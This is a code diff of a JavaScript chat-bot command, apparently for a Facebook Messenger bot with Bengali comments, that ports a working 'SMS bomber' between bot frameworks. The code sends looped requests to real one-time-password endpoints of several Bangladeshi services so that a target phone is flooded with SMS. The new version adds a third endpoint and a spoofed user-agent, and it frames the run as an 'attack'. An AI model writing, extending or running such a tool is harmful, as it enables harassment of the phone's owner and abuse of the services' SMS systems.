@@ -1,66 +1,82 @@
-const axios = require("axios");
+const fetch = require("node-fetch");
 
-module.exports = {
-  config: {
+module.exports.config = {
     name: "bomb",
-    aliases: ["smsbomb"],
-    version: "1.0",
-    author: "YourName",
-    countDown: 5,
-    role: 0,
-    shortDescription: "Send sms bomber",
-    longDescription: "Send multiple SMS using bomber API",
-    category: "fun",
-    guide: "{p}bomb <number> <amount>"
-  },
+    version: "1.0.0",
+    permission: 0,
+    credits: "Gift Bomber",
+    description: "SMS Bomber Tool",
+    commandCategory: "utility",
+    usages: ".bomb <number> <amount>",
+    cooldowns: 5
+};
 
-  onStart: async function ({ args, message }) {
-    if (args.length < 2) {
-      return message.reply("❌ ব্যবহার: .bomb <number> <amount>");
+module.exports.run = async function({ api, event, args }) {
+    const number = args[0];
+    const amount = parseInt(args[1]);
+
+    if (!number || !amount) {
+        return api.sendMessage("⚠️ ব্যবহার: .bomb <number> <amount>", event.threadID, event.messageID);
     }
 
-    let number = args[0];
-    let amount = parseInt(args[1]);
+    // ডিজাইন শুরু
+    api.sendMessage(
+`━━━━━━━━━━━━━━━━━━
+🎁 𝐆𝐈𝐅𝐓 𝐁𝐎𝐌𝐁𝐄𝐑 🎁
+━━━━━━━━━━━━━━━━━━
+📱 Target: ${number}
+🔢 Amount: ${amount}
+━━━━━━━━━━━━━━━━━━
+🚀 Attack Started...
+━━━━━━━━━━━━━━━━━━`,
+    event.threadID);
 
-    if (isNaN(amount) || amount <= 0) {
-      return message.reply("❌ Amount সঠিক দাও");
-    }
-
-    message.reply(`🚀 Bombing শুরু হলো! Target: ${number}, Amount: ${amount}`);
-
-    // Example API List
-    const APIS = [
-      {
-        url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({ phone: number, email: "", language: "en" })
-      },
-      {
-        url: "https://ss.binge.buzz/otp/send/login",
-        method: "POST",
-        headers: { "content-type": "application/x-www-form-urlencoded" },
-        body: `phone=${number}`
-      }
+    // API List
+    const apis = [
+        {
+            url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
+            method: "POST",
+            headers: { "content-type": "application/json", "user-agent": "Mozilla/5.0" },
+            body: (num) => JSON.stringify({ phone: num, email: "", language: "en" })
+        },
+        {
+            url: "https://ss.binge.buzz/otp/send/login",
+            method: "POST",
+            headers: { "content-type": "application/x-www-form-urlencoded" },
+            body: (num) => `phone=${num}`
+        },
+        {
+            url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&MobileNO=88${number}&countryPhoneCode=%2B88`,
+            method: "GET",
+            headers: { "user-agent": "Mozilla/5.0" },
+            body: null
+        }
+        // চাইলে আরো API যোগ করতে পারো
     ];
 
-    let sent = 0;
+    // Loop
     for (let i = 0; i < amount; i++) {
-      for (let api of APIS) {
-        try {
-          await axios({
-            method: api.method,
-            url: api.url,
-            headers: api.headers,
-            data: api.body
-          });
-          sent++;
-        } catch (e) {
-          console.log("Error sending:", e.message);
+        for (let apiData of apis) {
+            try {
+                await fetch(apiData.url, {
+                    method: apiData.method,
+                    headers: apiData.headers,
+                    body: apiData.body ? apiData.body(number) : null
+                });
+            } catch (e) {
+                console.log("Error:", e.message);
+            }
         }
-      }
     }
 
-    message.reply(`✅ Bombing শেষ! মোট চেষ্টা করা হয়েছে: ${sent} বার`);
-  }
+    // ডিজাইন End
+    api.sendMessage(
+`━━━━━━━━━━━━━━━━━━
+✅ Attack Finished!
+📱 Target: ${number}
+🔢 Total: ${amount}x
+━━━━━━━━━━━━━━━━━━
+👑 𝐑𝐀𝐇𝐀𝐃 𝐁𝐎𝐒𝐒 👑
+━━━━━━━━━━━━━━━━━━`,
+    event.threadID);
 };
